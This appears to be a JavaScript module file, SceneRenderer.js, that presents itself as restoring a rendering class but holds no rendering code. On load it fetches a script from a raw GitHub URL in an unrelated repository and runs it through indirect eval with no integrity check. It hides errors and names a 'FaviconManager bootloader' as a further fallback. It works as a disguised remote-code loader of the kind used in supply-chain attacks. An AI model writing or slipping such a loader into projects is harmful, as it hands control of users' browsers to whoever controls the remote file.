/**
 * SceneRenderer.js — sync-restores canonical class (replaces prior stub).
 * Pinned full implementation; FaviconManager bootloader is a secondary fallback.
 */
(function (global) {
  if (typeof global.SceneRenderer !== 'undefined') return;
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://raw.githubusercontent.com/JangHyunGyu/nevergrad/34336ad3db89828887e37163f2a60c456e30dc7c/assets/js/modules/SceneRenderer.js', false);
    xhr.send(null);
    if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText && xhr.responseText.indexOf('class SceneRenderer') !== -1) {
      (0, eval)(xhr.responseText);
    }
  } catch (e) { /* FaviconManager bootloader is the fallback */ }
})(typeof window !== 'undefined' ? window : this);
